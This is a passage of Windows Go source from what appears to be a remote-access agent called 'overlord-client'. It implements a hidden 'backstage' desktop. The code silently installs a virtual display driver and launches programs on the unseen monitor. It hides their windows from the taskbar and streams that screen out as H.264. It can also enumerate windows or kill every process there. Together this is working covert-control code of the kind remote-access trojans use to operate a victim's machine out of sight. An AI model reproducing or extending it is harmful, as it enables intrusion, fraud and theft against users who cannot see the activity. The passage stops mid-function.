//go:build windows

package capture

import (
	"errors"
	"fmt"
	"image"
	"log"
	"math"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"overlord-client/cmd/agent/webrtcpub"
	"overlord-client/cmd/agent/wire"
)

var (
	virtualMonitorName   string
	virtualMonitorBounds image.Rectangle
	virtualMonitorIndex  int
	virtualInitialized   bool
	virtualMu            sync.Mutex
	virtualPlacementGen  atomic.Uint64

	virtualCursorEnabled  bool
	virtualInputMu        sync.Mutex
	virtualLastCursor     point
	virtualHasCursor      bool
	virtualWorkingWindow  uintptr
	virtualShiftDown      bool
	virtualCtrlDown       bool
	virtualAltDown        bool
	virtualCapsLock       bool
	virtualMovingWindow   bool
	virtualMoveOffset     point
	virtualWindowSize     point
	virtualWindowToMove   uintptr
	virtualMouseButtons   uint32
	virtualLastScale      atomic.Uint64
	virtualResizingWindow uintptr
	virtualResizeHit      int32
	virtualResizeStart    point
	virtualResizeRect     rect
)

const (
	virtualDriverURLEnv  = "OVERLORD_virtual_DRIVER_URL"
	defaultDriverURL     = "https://github.com/VirtualDrivers/Virtual-Display-Driver/releases/latest/download/Virtual-Display-Driver.zip"
	virtualDriverDirName = "OverlordvirtualDriver"
)

type virtualDuplicationState struct {
	mu           sync.Mutex
	bounds       image.Rectangle
	outputName   string
	factory      *idxgiFactory1
	adapter      *idxgiAdapter1
	output       *idxgiOutput
	output1      *idxgiOutput1
	dup          *idxgiOutputDuplication
	device       *d3d11Device
	context      *d3d11DeviceContext
	staging      *d3d11Texture2D
	stagingDesc  d3d11Texture2DDesc
	h264LastTex  *d3d11Texture2D
	h264LastDesc d3d11Texture2DDesc
	desc         dxgiOutDuplDesc
	lastBase     *image.RGBA
	lastFrame    *image.RGBA
	lastFrameAt  time.Time
	lastFail     time.Time
	createdAt    time.Time
}

var virtualDupState = &virtualDuplicationState{}

func InitializeVirtualMode() error {
	virtualMu.Lock()
	defer virtualMu.Unlock()

	if virtualInitialized {
		return nil
	}

	monName, bounds, err := findVirtualMonitor()
	if err != nil {
		log.Printf("virtual: no virtual monitor found, attempting driver install: %v", err)
		if installErr := installVirtualDriver(); installErr != nil {
			return fmt.Errorf("virtual: failed to find or install virtual monitor driver: %v (install: %v)", err, installErr)
		}
		log.Printf("virtual: driver installed, re-detecting virtual monitor")
		monName, bounds, err = findVirtualMonitor()
		if err != nil {
			return fmt.Errorf("virtual: virtual monitor not found after driver install: %v", err)
		}
	}

	virtualMonitorName = monName
	virtualMonitorBounds = bounds
	// The capture backends address displays by EnumDisplayMonitors order, not
	// by DXGI adapter/output order. Resolve and retain that real index so virtual
	// mode captures the target monitor through the normal desktop path.
	ResetMonitorCache()
	virtualMonitorIndex = -1
	for i, mon := range monitorList() {
		if mon.rect.Eq(bounds) || (mon.name == monName && mon.rect.Dx() == bounds.Dx() && mon.rect.Dy() == bounds.Dy()) {
			virtualMonitorIndex = i
			break
		}
	}
	if virtualMonitorIndex < 0 {
		virtualInitialized = false
		return fmt.Errorf("virtual: attached monitor %q bounds=%v is missing from desktop monitor enumeration", monName, bounds)
	}
	virtualInitialized = true

	log.Printf("virtual: initialized virtual monitor %q index=%d bounds=%v", monName, virtualMonitorIndex, bounds)
	return nil
}

func CleanupVirtualMode() {
	virtualMu.Lock()
	defer virtualMu.Unlock()

	virtualPlacementGen.Add(1)

	virtualDupState.mu.Lock()
	virtualDupState.close()
	virtualDupState.mu.Unlock()

	virtualInputMu.Lock()
	virtualShiftDown = false
	virtualCtrlDown = false
	virtualAltDown = false
	virtualCapsLock = false
	virtualMouseButtons = 0
	virtualHasCursor = false
	virtualWorkingWindow = 0
	virtualInputMu.Unlock()
	virtualLastScale.Store(0)

	virtualMonitorName = ""
	virtualMonitorBounds = image.Rectangle{}
	virtualMonitorIndex = -1
	virtualInitialized = false
}

// VirtualCaptureNormal captures the virtual output through the exact backend
// used by ordinary remote desktop. This is important for indirect-display
// drivers which may expose a DXGI output but return an all-black duplication
// surface to a device created through a separate capture path.
func VirtualCaptureNormal() (*image.RGBA, error) {
	virtualMu.Lock()
	initialized := virtualInitialized
	index := virtualMonitorIndex
	bounds := virtualMonitorBounds
	virtualMu.Unlock()
	if !initialized || index < 0 {
		return nil, errors.New("virtual capture: monitor is not initialized")
	}
	mons := monitorList()
	if index >= len(mons) || !mons[index].rect.Eq(bounds) {
		ResetMonitorCache()
		mons = monitorList()
		index = -1
		for i, mon := range mons {
			if mon.rect.Eq(bounds) {
				index = i
				break
			}
		}
		if index < 0 {
			return nil, fmt.Errorf("virtual capture: monitor bounds %v disappeared", bounds)
		}
		virtualMu.Lock()
		virtualMonitorIndex = index
		virtualMu.Unlock()
	}
	return captureDisplayFn(index)
}

func VirtualMonitorCount() int {
	if !virtualInitialized {
		return 0
	}
	if virtualMonitorBounds.Dx() > 0 && virtualMonitorBounds.Dy() > 0 {
		return 1
	}
	return 0
}

var (
	virtualDXGIFactory     *idxgiFactory1
	virtualDXGIDevice      *d3d11Device
	virtualDXGIContext     *d3d11DeviceContext
	virtualDXGIOutput1     *idxgiOutput1
	virtualDXGIDup         *idxgiOutputDuplication
	virtualDXGIDesc        dxgiOutDuplDesc
	virtualDXGIStaging     *d3d11Texture2D
	virtualDXGIStagingDesc d3d11Texture2DDesc
	virtualDXGILastBase    *image.RGBA
	virtualDXGIMu          sync.Mutex
)

func VirtualTryDirectH264Frame() (wire.Frame, time.Duration, time.Duration, bool, error) {
	if backstageCodec() != "h264" {
		return wire.Frame{}, 0, 0, false, nil
	}
	return virtualDupState.captureDirectH264()
}

func (s *virtualDuplicationState) captureDirectH264() (wire.Frame, time.Duration, time.Duration, bool, error) {
	capStart := time.Now()
	s.mu.Lock()
	defer s.mu.Unlock()
	if err := s.ensure(); err != nil {
		return wire.Frame{}, 0, 0, true, err
	}
	width := int(s.desc.ModeDesc.Width)
	height := int(s.desc.ModeDesc.Height)
	if width <= 0 || height <= 0 || width%2 != 0 || height%2 != 0 {
		return wire.Frame{}, 0, 0, true, fmt.Errorf("virtual h264: invalid dimensions %dx%d", width, height)
	}
	if s.desc.Rotation != dxgiModeRotationIdentity && s.desc.Rotation != dxgiModeRotationUnspecified {
		return wire.Frame{}, 0, 0, true, fmt.Errorf("virtual h264: non-identity rotation")
	}

	var info dxgiOutDuplFrameInfo
	var resource *iunknown
	waitMs := uint32(5)
	if s.h264LastTex != nil {
		// Once a cached GPU frame exists, polling must be non-blocking. A fixed
		// 5 ms duplication wait would cap a 120/240 FPS stream well below its
		// requested cadence even though encoding takes under a millisecond.
		waitMs = 0
	}
	hr := s.dup.AcquireNextFrame(waitMs, &info, &resource)
	if hr == dxgiErrorWaitTimeout {
		if s.h264LastTex == nil {
			return wire.Frame{}, time.Since(capStart), 0, true, nil
		}
		return s.encodeCachedDirectH264(capStart, width, height)
	}
	if hr != S_OK {
		if hr == dxgiErrorAccessLost || hr == dxgiErrorDeviceRemoved || hr == dxgiErrorDeviceReset {
			s.close()
		}
		return wire.Frame{}, 0, 0, true, fmt.Errorf("virtual h264: acquire frame 0x%x", hr)
	}
	if resource != nil {
		defer resource.Release()
	}

	var tex *d3d11Texture2D
	hr = resource.QueryInterface(&IID_ID3D11Texture2D, unsafe.Pointer(&tex))
	if hr != S_OK || tex == nil {
		_ = s.dup.ReleaseFrame()
		return wire.Frame{}, 0, 0, true, fmt.Errorf("virtual h264: not ID3D11Texture2D 0x%x", hr)
	}
	defer tex.Release()

	var srcDesc d3d11Texture2DDesc
	tex.GetDesc(&srcDesc)
	if err := s.cacheDirectH264Texture(tex, srcDesc); err != nil {
		_ = s.dup.ReleaseFrame()
		return wire.Frame{}, time.Since(capStart), 0, true, err
	}
	_ = s.dup.ReleaseFrame()
	return s.encodeCachedDirectH264(capStart, width, height)
}

func (s *virtualDuplicationState) encodeCachedDirectH264(capStart time.Time, width, height int) (wire.Frame, time.Duration, time.Duration, bool, error) {
	fps := activeH264FPSForStream("backstage")
	encStart := time.Now()
	out, _, err := encodeH264D3D11Texture("backstage", h264D3D11TextureRequest{
		Device: unsafe.Pointer(s.device), Texture: unsafe.Pointer(s.h264LastTex),
		InputWidth: width, InputHeight: height, EncodeWidth: width, EncodeHeight: height,
		FPS: fps, DXGIFormat: s.h264LastDesc.Format, ForceIDR: webrtcpub.ConsumeKeyframeRequest(webrtcpub.Kindbackstage),
	})
	encodeDur := time.Since(encStart)
	if err != nil {
		return wire.Frame{}, time.Since(capStart), encodeDur, true, err
	}
	if len(out) == 0 {
		return wire.Frame{}, time.Since(capStart), encodeDur, true, nil
	}
	return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: 0, FPS: 0, Format: "h264", Backstage: true}, Data: out}, time.Since(capStart), encodeDur, true, nil
}

func (s *virtualDuplicationState) cacheDirectH264Texture(src *d3d11Texture2D, srcDesc d3d11Texture2DDesc) error {
	recreate := s.h264LastTex == nil || s.h264LastDesc.Width != srcDesc.Width || s.h264LastDesc.Height != srcDesc.Height || s.h264LastDesc.Format != srcDesc.Format
	if recreate {
		if s.h264LastTex != nil {
			s.h264LastTex.Release()
			s.h264LastTex = nil
		}
		desc := srcDesc
		desc.MipLevels, desc.ArraySize = 1, 1
		desc.SampleDesc.Count, desc.SampleDesc.Quality = 1, 0
		desc.Usage, desc.BindFlags, desc.CPUAccessFlags, desc.MiscFlags = 0, 0, 0, 0
		if hr := s.device.CreateTexture2D(&desc, nil, &s.h264LastTex); hr != S_OK || s.h264LastTex == nil {
			return fmt.Errorf("virtual h264: cache texture creation failed 0x%x", hr)
		}
		s.h264LastDesc = desc
	}
	s.context.CopyResource(s.h264LastTex, src)
	return nil
}

func VirtualCaptureDXGI() (*image.RGBA, error) {
	virtualDXGIMu.Lock()
	defer virtualDXGIMu.Unlock()

	if err := VirtualEnsureDXGI(); err != nil {
		return nil, err
	}

	var info dxgiOutDuplFrameInfo
	var resource *iunknown
	waitMs := uint32(5)
	hr := uintptr(0)
	for {
		hr = virtualDXGIDup.AcquireNextFrame(waitMs, &info, &resource)
		if hr != dxgiErrorWaitTimeout {
			break
		}
		if virtualDXGILastBase != nil {
			return cloneRGBA(virtualDXGILastBase), nil
		}
		if waitMs >= 50 {
			return nil, errors.New("virtual dxgi: frame timeout")
		}
		waitMs = 50
	}
	if hr == dxgiErrorAccessLost {
		VirtualDestroyDXGI()
		return nil, errors.New("virtual dxgi: access lost")
	}
	if hr == dxgiErrorDeviceRemoved || hr == dxgiErrorDeviceReset {
		VirtualDestroyDXGI()
		return nil, fmt.Errorf("virtual dxgi: device lost 0x%x", hr)
	}
	if hr != S_OK {
		return nil, fmt.Errorf("virtual dxgi: acquire frame failed 0x%x", hr)
	}
	if resource != nil {
		defer resource.Release()
	}

	width := int(virtualDXGIDesc.ModeDesc.Width)
	height := int(virtualDXGIDesc.ModeDesc.Height)
	if width <= 0 || height <= 0 {
		_ = virtualDXGIDup.ReleaseFrame()
		return nil, errors.New("virtual dxgi: invalid frame size")
	}

	var img *image.RGBA
	if virtualDXGIDesc.DesktopImageInSystemMemory != 0 {
		var mapped dxgiMappedRect
		hr = virtualDXGIDup.MapDesktopSurface(&mapped)
		if hr != S_OK {
			_ = virtualDXGIDup.ReleaseFrame()
			return nil, fmt.Errorf("virtual dxgi: map failed 0x%x", hr)
		}
		dup := virtualDXGIDup
		defer func() {
			_ = dup.UnMapDesktopSurface()
			_ = dup.ReleaseFrame()
		}()
		if mapped.Pitch <= 0 || mapped.Bits == nil {
			return nil, errors.New("virtual dxgi: invalid mapped surface")
		}
		pitch := int(mapped.Pitch)
		src := unsafe.Slice(mapped.Bits, pitch*height)
		img = convertBGRA(src, pitch, width, height, virtualDXGIDesc.Rotation)
		if img == nil {
			return nil, errors.New("virtual dxgi: pixel conversion failed")
		}
	} else {
		var tex *d3d11Texture2D
		hr = resource.QueryInterface(&IID_ID3D11Texture2D, unsafe.Pointer(&tex))
		if hr != S_OK || tex == nil {
			_ = virtualDXGIDup.ReleaseFrame()
			return nil, fmt.Errorf("virtual dxgi: not texture 0x%x", hr)
		}
		defer tex.Release()

		var srcDesc d3d11Texture2DDesc
		tex.GetDesc(&srcDesc)
		if virtualDXGIStaging == nil || virtualDXGIStagingDesc.Width != srcDesc.Width || virtualDXGIStagingDesc.Height != srcDesc.Height || virtualDXGIStagingDesc.Format != srcDesc.Format {
			if virtualDXGIStaging != nil {
				virtualDXGIStaging.Release()
				virtualDXGIStaging = nil
			}
			sd := srcDesc
			sd.Usage = d3d11UsageStaging
			sd.BindFlags = 0
			sd.CPUAccessFlags = d3d11CpuAccessRead
			sd.MiscFlags = 0
			sd.MipLevels = 1
			sd.ArraySize = 1
			sd.SampleDesc.Count = 1
			sd.SampleDesc.Quality = 0
			var staging *d3d11Texture2D
			hr = virtualDXGIDevice.CreateTexture2D(&sd, nil, &staging)
			if hr != S_OK || staging == nil {
				_ = virtualDXGIDup.ReleaseFrame()
				return nil, fmt.Errorf("virtual dxgi: staging texture 0x%x", hr)
			}
			virtualDXGIStaging = staging
			virtualDXGIStagingDesc = sd
		}
		virtualDXGIContext.CopyResource(virtualDXGIStaging, tex)
		_ = virtualDXGIDup.ReleaseFrame()

		var mapped d3d11MappedSubresource
		hr = virtualDXGIContext.Map(virtualDXGIStaging, 0, d3d11MapRead, 0, &mapped)
		if hr != S_OK {
			return nil, fmt.Errorf("virtual dxgi: map 0x%x", hr)
		}
		defer virtualDXGIContext.Unmap(virtualDXGIStaging, 0)

		pitch := int(mapped.RowPitch)
		src := unsafe.Slice((*byte)(mapped.Data), pitch*int(srcDesc.Height))
		img = convertBGRA(src, pitch, int(srcDesc.Width), int(srcDesc.Height), virtualDXGIDesc.Rotation)
	}

	if img != nil {
		virtualDXGILastBase = cloneRGBA(img)
	}
	return img, nil
}

func VirtualCaptureGDI() (*image.RGBA, error) {
	virtualMu.Lock()
	bounds := virtualMonitorBounds
	virtualMu.Unlock()

	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		return nil, fmt.Errorf("virtual gdi: no virtual monitor bounds")
	}

	monitors := monitorList()
	for _, m := range monitors {
		if m.rect.Min.X == bounds.Min.X && m.rect.Min.Y == bounds.Min.Y {
			return captureVirtualGDIBlt(m)
		}
	}
	return nil, fmt.Errorf("virtual gdi: virtual monitor not in monitor list")
}

func captureVirtualGDIBlt(mon monitorDesc) (*image.RGBA, error) {
	width := mon.rect.Dx()
	height := mon.rect.Dy()
	if width <= 0 || height <= 0 {
		return nil, syscall.EINVAL
	}

	hdcScreen := getDC(0)
	if hdcScreen == 0 {
		return nil, fmt.Errorf("gdi blt: getDC failed")
	}
	defer releaseDC(0, hdcScreen)

	hdcMem := createCompatibleDC(hdcScreen)
	if hdcMem == 0 {
		return nil, fmt.Errorf("gdi blt: createCompatibleDC failed")
	}
	defer deleteDC(hdcMem)

	bmi := bitmapInfo{
		bmiHeader: bitmapInfoHeader{
			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
			biWidth:       int32(width),
			biHeight:      -int32(height),
			biPlanes:      1,
			biBitCount:    32,
			biCompression: BI_RGB,
		},
	}
	var bits unsafe.Pointer
	hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
	if hbmp == 0 || bits == nil {
		return nil, fmt.Errorf("gdi blt: createDIBSection failed")
	}
	defer deleteObject(hbmp)

	selectObject(hdcMem, hbmp)
	bitBlt(hdcMem, 0, 0, int32(width), int32(height), hdcScreen, int32(mon.rect.Min.X), int32(mon.rect.Min.Y), SRCCOPY)

	img := image.NewRGBA(image.Rect(0, 0, width, height))
	buf := unsafe.Slice((*byte)(bits), width*height*4)
	copy(img.Pix, buf)
	return img, nil
}

func VirtualEnsureDXGI() error {
	if virtualDXGIDup != nil {
		return nil
	}
	VirtualDestroyDXGI()

	virtualMu.Lock()
	bounds := virtualMonitorBounds
	virtualMu.Unlock()

	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		return errors.New("virtual dxgi: no virtual monitor bounds")
	}

	factory, err := createDXGIFactory1()
	if err != nil {
		return err
	}

	var primaryAdapter *idxgiAdapter1
	hr := factory.EnumAdapters1(0, &primaryAdapter)
	if hr != S_OK || primaryAdapter == nil {
		factory.Release()
		return fmt.Errorf("virtual dxgi: no primary adapter 0x%x", hr)
	}

	device, context, err := createD3DDevice(primaryAdapter)
	if err != nil {
		primaryAdapter.Release()
		factory.Release()
		return fmt.Errorf("virtual dxgi: D3D device failed: %v", err)
	}

	var targetOutput *idxgiOutput
	var targetAdapter *idxgiAdapter1
	foundOutput := false

	for adapterIndex := 0; ; adapterIndex++ {
		var adapter *idxgiAdapter1
		hr := factory.EnumAdapters1(uint32(adapterIndex), &adapter)
		if hr == dxgiErrorNotFound {
			break
		}
		if hr != S_OK || adapter == nil {
			continue
		}

		for outputIndex := 0; ; outputIndex++ {
			var output *idxgiOutput
			hrOut := adapter.EnumOutputs(uint32(outputIndex), &output)
			if hrOut == dxgiErrorNotFound {
				break
			}
			if hrOut != S_OK || output == nil {
				continue
			}

			var desc dxgiOutputDesc
			_ = output.GetDesc(&desc)
			coords := image.Rect(
				int(desc.DesktopCoordinates.left),
				int(desc.DesktopCoordinates.top),
				int(desc.DesktopCoordinates.right),
				int(desc.DesktopCoordinates.bottom),
			)

			if coords.Dx() == bounds.Dx() && coords.Dy() == bounds.Dy() &&
				coords.Min.X == bounds.Min.X && coords.Min.Y == bounds.Min.Y &&
				desc.AttachedToDesktop != 0 {
				targetOutput = output
				targetAdapter = adapter
				foundOutput = true
				break
			}
			output.Release()
		}
		if foundOutput {
			break
		}
		adapter.Release()
	}

	if !foundOutput {
		context.Release()
		device.Release()
		primaryAdapter.Release()
		factory.Release()
		return errors.New("virtual dxgi: virtual monitor output not found")
	}

	var output1 *idxgiOutput1
	hr = (*iunknown)(unsafe.Pointer(targetOutput)).QueryInterface(&IID_IDXGIOutput1, unsafe.Pointer(&output1))
	if hr != S_OK || output1 == nil {
		targetAdapter.Release()
		targetOutput.Release()
		context.Release()
		device.Release()
		primaryAdapter.Release()
		factory.Release()
		return errors.New("virtual dxgi: IDXGIOutput1 query failed")
	}

	var dup *idxgiOutputDuplication
	hr = output1.DuplicateOutput((*iunknown)(unsafe.Pointer(device)), &dup)
	if hr != S_OK || dup == nil {
		output1.Release()
		targetAdapter.Release()
		targetOutput.Release()
		context.Release()
		device.Release()
		primaryAdapter.Release()
		factory.Release()
		return fmt.Errorf("virtual dxgi: DuplicateOutput failed 0x%x (try GDI)", hr)
	}

	var desc dxgiOutDuplDesc
	_ = dup.GetDesc(&desc)

	targetAdapter.Release()
	targetOutput.Release()
	primaryAdapter.Release()

	virtualDXGIFactory = factory
	virtualDXGIDevice = device
	virtualDXGIContext = context
	virtualDXGIOutput1 = output1
	virtualDXGIDup = dup
	virtualDXGIDesc = desc

	if desc.DesktopImageInSystemMemory == 0 {
		log.Printf("virtual: dxgi duplication initialized (staging readback) bounds=%v", bounds)
	} else {
		log.Printf("virtual: dxgi duplication initialized (system memory) bounds=%v", bounds)
	}
	return nil
}

func VirtualResetDXGI() {
	virtualDXGIMu.Lock()
	VirtualDestroyDXGI()
	virtualDXGIMu.Unlock()
	virtualDupState.mu.Lock()
	virtualDupState.close()
	virtualDupState.mu.Unlock()
}

func VirtualDestroyDXGI() {
	if virtualDXGIDup != nil {
		virtualDXGIDup.Release()
		virtualDXGIDup = nil
	}
	if virtualDXGIStaging != nil {
		virtualDXGIStaging.Release()
		virtualDXGIStaging = nil
		virtualDXGIStagingDesc = d3d11Texture2DDesc{}
	}
	if virtualDXGIOutput1 != nil {
		virtualDXGIOutput1.Release()
		virtualDXGIOutput1 = nil
	}
	if virtualDXGIContext != nil {
		virtualDXGIContext.Release()
		virtualDXGIContext = nil
	}
	if virtualDXGIDevice != nil {
		virtualDXGIDevice.Release()
		virtualDXGIDevice = nil
	}
	if virtualDXGIFactory != nil {
		virtualDXGIFactory.Release()
		virtualDXGIFactory = nil
	}
	virtualDXGIDesc = dxgiOutDuplDesc{}
	PutRGBA(virtualDXGILastBase)
	virtualDXGILastBase = nil
}

func VirtualCaptureDisplay() (*image.RGBA, error) {
	virtualMu.Lock()
	if !virtualInitialized {
		virtualMu.Unlock()
		return nil, fmt.Errorf("virtual mode not initialized")
	}
	virtualMu.Unlock()

	return virtualDupState.capture()
}

func StartVirtualProcess(filePath string) (uint32, error) {
	virtualMu.Lock()
	if !virtualInitialized {
		virtualMu.Unlock()
		return 0, fmt.Errorf("virtual mode not initialized")
	}
	bounds := virtualMonitorBounds
	virtualMu.Unlock()

	if strings.TrimSpace(filePath) == "" {
		return 0, errors.New("virtual: empty command line")
	}
	// Some launchers (notably explorer.exe and Chromium) hand the request to an
	// existing process. Remember the current windows so placement can also find
	// the newly-created top-level window when it is not owned by the returned PID.
	baseline := virtualTopLevelWindowSet()

	cmdLine, err := syscall.UTF16FromString(filePath)
	if err != nil {
		return 0, fmt.Errorf("virtual: failed to convert command line: %v", err)
	}

	var si startupInfo
	var pi processInformation
	si.cb = uint32(unsafe.Sizeof(si))
	si.dwX = uint32(bounds.Min.X)
	si.dwY = uint32(bounds.Min.Y)
	si.dwXSize = uint32(bounds.Dx())
	si.dwYSize = uint32(bounds.Dy())
	si.dwFlags = STARTF_USEPOSITION | STARTF_USESIZE
	creationFlags := uintptr(0)
	if virtualCommandNeedsNewConsole(filePath) {
		// Console hosts only consistently honor STARTF_USEPOSITION when Windows
		// creates a fresh console. This places cmd/PowerShell on the virtual
		// monitor before their first visible frame; the window mover remains a
		// fallback for applications that override STARTUPINFO.
		creationFlags = CREATE_NEW_CONSOLE
	}

	ret, _, callErr := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(&cmdLine[0])),
		0,
		0,
		0,
		creationFlags,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		if callErr != nil {
			return 0, fmt.Errorf("virtual: CreateProcess failed: %v", callErr)
		}
		return 0, fmt.Errorf("virtual: CreateProcess failed")
	}

	pid := pi.dwProcessId
	log.Printf("virtual: started process %q (pid=%d), moving windows to virtual monitor", filePath, pid)

	placementGen := virtualPlacementGen.Load()
	go moveProcessWindowsToVirtualMonitor(pid, bounds, baseline, placementGen)

	if pi.hThread != 0 {
		procCloseHandle.Call(pi.hThread)
	}
	if pi.hProcess != 0 {
		procCloseHandle.Call(pi.hProcess)
	}

	return pid, nil
}

func virtualCommandNeedsNewConsole(commandLine string) bool {
	s := strings.ToLower(strings.TrimSpace(commandLine))
	if strings.HasPrefix(s, `"`) {
		s = strings.TrimPrefix(s, `"`)
	}
	first := s
	if i := strings.IndexAny(first, " \t\""); i >= 0 {
		first = first[:i]
	}
	first = strings.ToLower(filepath.Base(first))
	switch first {
	case "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh", "pwsh.exe", "conhost", "conhost.exe":
		return true
	default:
		return false
	}
}

func virtualTopLevelWindowSet() map[uintptr]struct{} {
	result := make(map[uintptr]struct{})
	deskHwnd, _, _ := procGetDesktopWindow.Call()
	for hwnd := getTopWindow(deskHwnd); hwnd != 0; hwnd = getWindow(hwnd, GW_HWNDNEXT) {
		result[hwnd] = struct{}{}
	}
	return result
}

func moveProcessWindowsToVirtualMonitor(pid uint32, bounds image.Rectangle, baseline map[uintptr]struct{}, placementGen uint64) {
	hwndMap := make(map[uintptr]bool)

	for attempt := 0; attempt < 300; attempt++ {
		if virtualPlacementGen.Load() != placementGen {
			return
		}
		deskHwnd, _, _ := procGetDesktopWindow.Call()
		hwnd := getTopWindow(deskHwnd)
		if hwnd == 0 {
			time.Sleep(virtualPlacementPollDelay(attempt))
			continue
		}

		moved := 0
		for hwnd != 0 {
			visible := isWindowVisible(hwnd)
			if !visible {
				hwnd = getWindow(hwnd, GW_HWNDNEXT)
				continue
			}

			var winPID uint32
			procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&winPID)))
			_, existedBeforeLaunch := baseline[hwnd]
			if winPID != pid && existedBeforeLaunch {
				hwnd = getWindow(hwnd, GW_HWNDNEXT)
				continue
			}

			if alreadyVisibleMove, already := hwndMap[hwnd]; already && (!visible || alreadyVisibleMove) {
				hwnd = getWindow(hwnd, GW_HWNDNEXT)
				continue
			}

			var r rect
			procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
			winW := int(r.right - r.left)
			winH := int(r.bottom - r.top)
			if winW <= 0 || winH <= 0 {
				hwnd = getWindow(hwnd, GW_HWNDNEXT)
				continue
			}

			newX := int32(bounds.Min.X)
			newY := int32(bounds.Min.Y)
			// Keep the whole window on the target display and allow Windows to
			// apply the appropriate per-monitor DPI/non-client recalculation.
			if winW > bounds.Dx() {
				winW = bounds.Dx()
			}
			if winH > bounds.Dy() {
				winH = bounds.Dy()
			}
			flags := uintptr(SWP_NOZORDER | SWP_NOACTIVATE | SWP_SHOWWINDOW)
			procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(winW), uintptr(winH), flags)
			hwndMap[hwnd] = visible

			gwlExStyle := int(GWL_EXSTYLE)
			exStyle, _, _ := procGetWindowLongPtrW.Call(hwnd, uintptr(gwlExStyle))
			if exStyle != 0 {
				procSetWindowLongPtrW.Call(hwnd, uintptr(gwlExStyle), exStyle|WS_EX_TOOLWINDOW)
			}

			log.Printf("virtual: moved window hwnd=0x%x (pid=%d) to virtual monitor (%d,%d)", hwnd, pid, bounds.Min.X, bounds.Min.Y)
			moved++
			break
		}

		_ = moved // keep watching for child/handed-off windows after the first one
		time.Sleep(virtualPlacementPollDelay(attempt))
	}
}

func virtualPlacementPollDelay(attempt int) time.Duration {
	switch {
	case attempt < 120:
		return 10 * time.Millisecond
	case attempt < 180:
		return 50 * time.Millisecond
	default:
		return 200 * time.Millisecond
	}
}

func VirtualKillAll() error {
	virtualMu.Lock()
	bounds := virtualMonitorBounds
	virtualMu.Unlock()

	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		return fmt.Errorf("virtual: no virtual monitor bounds")
	}

	type rawWin struct {
		hwnd uintptr
	}
	var windows []rawWin

	cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
		windows = append(windows, rawWin{hwnd: hwnd})
		return 1
	})

	deskHwnd, _, _ := procGetDesktopWindow.Call()
	procEnumDesktopWindows.Call(deskHwnd, cb, 0)

	pids := make(map[uint32]struct{})
	for _, w := range windows {
		var r rect
		ok, _, _ := procGetWindowRect.Call(w.hwnd, uintptr(unsafe.Pointer(&r)))
		if ok == 0 {
			continue
		}
		winLeft := int(r.left)
		winTop := int(r.top)
		winRight := int(r.right)
		winBottom := int(r.bottom)
		if winRight <= winLeft || winBottom <= winTop {
			continue
		}

		if winLeft >= bounds.Min.X && winTop >= bounds.Min.Y &&
			winLeft < bounds.Max.X && winTop < bounds.Max.Y {
			var pid uint32
			procGetWindowThreadProcessId.Call(w.hwnd, uintptr(unsafe.Pointer(&pid)))
			if pid != 0 {
				pids[pid] = struct{}{}
			}
		}
	}

	const PROCESS_TERMINATE = 0x0001
	killed := 0
	for pid := range pids {
		hProc, _, _ := kernel32.NewProc("OpenProcess").Call(PROCESS_TERMINATE, 0, uintptr(pid))
		if hProc != 0 {
			procTerminateProcess.Call(hProc, 1)
			kernel32.NewProc("CloseHandle").Call(hProc)
			killed++
		}
	}
	log.Printf("virtual: kill all: terminated %d processes across %d pids", killed, len(pids))
	return nil
}

func VirtualEnumWindows() ([]BackstageWindowInfo, []BackstageMonitorInfo) {
	virtualMu.Lock()
	bounds := virtualMonitorBounds
	name := virtualMonitorName
	initialized := virtualInitialized
	virtualMu.Unlock()

	if !initialized || bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		return nil, nil
	}

	monInfos := []BackstageMonitorInfo{{
		Index:   0,
		Name:    name,
		X:       bounds.Min.X,
		Y:       bounds.Min.Y,
		Width:   bounds.Dx(),
		Height:  bounds.Dy(),
		Primary: false,
	}}

	type rawWin struct {
		hwnd uintptr
	}
	var windowList []rawWin

	cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
		windowList = append(windowList, rawWin{hwnd: hwnd})
		return 1
	})

	deskHwnd, _, _ := procGetDesktopWindow.Call()
	procEnumDesktopWindows.Call(deskHwnd, cb, 0)

	var result []BackstageWindowInfo
	for _, w := range windowList {
		if !isWindowVisible(w.hwnd) {
			continue
		}
		var r rect
		ok, _, _ := procGetWindowRect.Call(w.hwnd, uintptr(unsafe.Pointer(&r)))
		if ok == 0 {
			continue
		}
		winW := int(r.right - r.left)
		winH := int(r.bottom - r.top)
		if winW <= 0 || winH <= 0 {
			continue
		}

		title := getWindowText(w.hwnd)
		if title == "" {
			continue
		}

		var pid uint32
		procGetWindowThreadProcessId.Call(w.hwnd, uintptr(unsafe.Pointer(&pid)))

		procName := ""
		if pid != 0 {
			procName = getProcessName(pid)
		}

		winLeft := int(r.left)
		winTop := int(r.top)
		monIdx := -1
		if winLeft >= bounds.Min.X && winTop >= bounds.Min.Y &&
			winLeft < bounds.Max.X && winTop < bounds.Max.Y {
			monIdx = 0
		}

		result = append(result, BackstageWindowInfo{
			HWND:        w.hwnd,
			Title:       title,
			X:           winLeft,
			Y:           winTop,
			Width:       winW,
			Height:      winH,
			PID:         pid,
			ProcessName: procName,
			Monitor:     monIdx,
			Visible:     true,
		})
	}
	return result, monInfos
}

func findVirtualMonitor() (string, image.Rectangle, error) {
	factory, err := createDXGIFactory1()
	if err != nil {
		return "", image.Rectangle{}, fmt.Errorf("dxgi factory: %v", err)
	}
	defer factory.Release()

	var fallbackName string
	var fallbackAdapter *idxgiAdapter1
	var fallbackOutput *idxgiOutput

	for adapterIndex := 0; ; adapterIndex++ {
